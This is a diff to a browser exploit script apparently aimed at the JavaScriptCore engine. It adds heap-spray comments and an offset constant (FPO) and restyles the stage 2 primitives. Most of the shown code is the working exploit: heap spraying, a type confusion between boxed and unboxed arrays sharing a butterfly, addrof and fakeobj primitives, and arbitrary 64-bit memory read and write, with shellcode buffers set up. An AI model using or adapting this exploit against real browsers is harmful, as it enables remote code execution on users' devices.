@@ -23,11 +23,12 @@ var f64 = new Float64Array(conversion_buffer);
 var i32 = new Uint32Array(conversion_buffer);
 var BASE32 = 0x100000000;
 
+
 var workbuf = new ArrayBuffer(0x1000000)
 var u32_buffer = new Uint32Array(workbuf);
 var u8_buffer = new Uint8Array(workbuf);
 var shellcode_length = 0;
-
+var FPO = typeof(SharedArrayBuffer) === 'undefined' ? 0x18 : 0x10;
 
 //Hex conversion
 function hex(x) {
@@ -117,6 +118,9 @@ var pwn = function() {
     //Spray the heap with structures
     var structure_spray = [];
     for (var i = 0; i < 1000; ++i) {
+        // last property is 0xfffffff because we want that value to
+        // preceed the manager, so when manager gets reused as
+        // butterfly, it's vectorLength is big enough
         var ary = {a:1,b:2,c:3,d:4,e:5,f:6,g:0xfffffff};
         ary['prop'+i] = 1;
         structure_spray.push(ary);
@@ -141,6 +145,15 @@ var pwn = function() {
     }
     
     var unboxed_size = 100;
+    // Two arrays are created: unboxed and boxed
+    // their butterflies are then set to same value
+    // so unboxed[i] would point to same memory as boxed[i]
+    // this leads to easy type confusion:
+    // JSValue (inc. pointers) with floats
+    // see saelo's phrack article, look for "JSC defines a set of
+    // different indexing types".
+    // JSC sees huge array containing only floats, so they'd be stored
+    // as floats and retrived as floats, not as normal JSValue's
     var unboxed = alloc_above_manager('[' + '13.37,'.repeat(unboxed_size) + ']'); //array with double
     var boxed = alloc_above_manager('[{}]'); //array with object
     var victim = alloc_above_manager('[]'); //array
@@ -167,9 +180,9 @@ var pwn = function() {
     };
     
 
-    print("Using padding: "+_off.padding);
+    print("Using padding: "+(FPO+0x8));
     
-    var fake_addr = stage1.addrof(outer) + _off.padding;
+    var fake_addr = stage1.addrof(outer) +FPO+0x8;
     
     if(verbosity >= VERBOSITY_HIGH) print('fake object is at ' + hex(fake_addr));
     
@@ -191,7 +204,6 @@ var pwn = function() {
     // Share a butterfly for easier boxing/unboxing
     var shared_butterfly = f2i(holder.fake[(unboxed_addr + 8 - leak_addr) / 8]);
     var boxed_butterfly = holder.fake[(boxed_addr + 8 - leak_addr) / 8];
-    
     holder.fake[(boxed_addr + 8 - leak_addr) / 8] = i2f(shared_butterfly);
     
     var victim_butterfly = holder.fake[(victim_addr + 8 - leak_addr) / 8];
@@ -207,63 +219,59 @@ var pwn = function() {
     print('Stage (1/2) done.');
     
     //Alright, this is where we get full r/w to memory
+    //Thanks to stek29
     var stage2 = {
         addrof: function(victim) {
-            boxed[0] = victim;
+            boxed[0] = victim
             return f2i(unboxed[0])
         },
 
         fakeobj: function(addr) {
-            unboxed[0] = i2f(addr);
-            return boxed[0];
+            unboxed[0] = i2f(addr)
+            return boxed[0]
         },
 
         write64: function(where, what) {
-            set_victim_addr(where);
-            victim_write(this.fakeobj(what));
-            reset_victim_addr();
+            set_victim_addr(where)
+            victim_write(this.fakeobj(what))
+            reset_victim_addr()
         },
 
         read64: function(where) {
-            set_victim_addr(where);
-            var res = this.addrof(victim_read());
-            reset_victim_addr();
-            return res;
+            set_victim_addr(where)
+            var res = this.addrof(victim_read())
+            reset_victim_addr()
+            return res
         },
 
         write_non_zero: function(where, values) {
             for (var i = 0; i < values.length; ++i) {
-                if (values[i] != 0) {
-                    this.write64(where + i*8, values[i]);
-                }
+                if (values[i] != 0)
+                    this.write64(where + i*8, values[i])
             }
         },
 
         test: function() {
             this.write64(boxed_addr + 0x10, 0xfff) // Overwrite index mask, no biggie
             if (0xfff != this.read64(boxed_addr + 0x10)) {
-                fail(2);
+                fail(2)
             }
         },
 
         forge: function(values) {
-            for (var i = 0; i < values.length; ++i) {
-                unboxed[1 + i] = i2f(values[i]);
-            }
-            return shared_butterfly + 8;
+            for (var i = 0; i < values.length; ++i)
+                unboxed[1 + i] = i2f(values[i])
+            return shared_butterfly + 8
         },
 
         clear: function() {
-            outer = null;;
-            holder.fake = null;
-            for (var i = 0; i < unboxed_size; ++i) {
-                boxed[0] = null;
-            }
+            outer = null
+            holder.fake = null
+            for (var i = 0; i < unboxed_size; ++i)
+                boxed[0] = null
         },
-    };
+    }
 
-    // Test read/write
-    stage2.test();
 
     if(verbosity === VERBOSITY_VERBOSE) print("Stage 2 test succeeded, continueing...");
     
